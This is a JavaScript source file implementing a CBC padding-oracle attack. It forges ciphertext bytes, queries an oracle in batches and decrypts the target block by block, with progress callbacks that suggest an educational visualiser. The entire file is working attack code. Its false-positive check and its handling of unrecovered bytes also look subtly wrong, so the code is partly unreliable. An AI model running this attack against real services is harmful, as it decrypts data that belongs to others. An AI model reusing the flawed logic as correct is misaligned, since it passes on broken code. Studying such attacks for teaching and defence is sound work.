import { splitBlocks, bytesToBase64, base64ToBytes } from "./blocks";

export async function runPaddingAttack(
  cipher,
  oracle,
  onUpdate,
  speed = 0,
  fastMode = true
) {
  const originalBytes = base64ToBytes(cipher);
  const blocks = splitBlocks(cipher);

  let plaintextBytes = [];
  let totalBytes = (blocks.length - 1) * 16;
  let processed = 0;

  const BATCH = 16;

  for (let b = blocks.length - 1; b > 0; b--) {
    let intermediate = new Uint8Array(16);
    let recovered = new Uint8Array(16);

    for (let i = 15; i >= 0; i--) {
      const pad = 16 - i;

      let found = false;

      for (let k = 0; k < 256; k += BATCH) {
        const promises = [];

        for (let guess = k; guess < k + BATCH; guess++) {
          const forged = new Uint8Array(originalBytes);

          // modify previous block
          const offset = (b - 1) * 16;

          for (let j = 15; j > i; j--) {
            forged[offset + j] =
              intermediate[j] ^ pad;
          }

          forged[offset + i] = guess;

          const payload = bytesToBase64(forged);

          promises.push(
            oracle(payload).then((res) => ({
              res,
              guess,
            }))
          );
        }

        const results = await Promise.all(promises);

        for (const r of results) {
          if (r.res.status !== "valid") continue;

          // ---- FALSE POSITIVE CHECK ----
          const forged = new Uint8Array(originalBytes);
          const offset = (b - 1) * 16;

          forged[offset + i] = r.guess ^ 1; // disturb padding

          const test = await oracle(bytesToBase64(forged));

          if (test.status === "valid") continue;

          // ---- VALID BYTE ----
          intermediate[i] = r.guess ^ pad;

          const prevByte =
            originalBytes[offset + i];

          recovered[i] =
            intermediate[i] ^ prevByte;

          plaintextBytes.unshift(recovered[i]);

          processed++;

          const progress =
            (processed / totalBytes) * 100;

          onUpdate({
            block: b,
            byte: i,
            guess: r.guess,
            status: "valid",
            progress,
            recoveredText: new TextDecoder().decode(
              new Uint8Array(plaintextBytes)
            ),
          });

          found = true;
          break;
        }

        if (found) break;

        if (!fastMode && speed > 0) {
          await new Promise((r) =>
            setTimeout(r, speed)
          );
        }
      }

      if (!found) {
        recovered[i] = 0;
      }
    }
  }

  return new TextDecoder().decode(
    new Uint8Array(plaintextBytes)
  );
}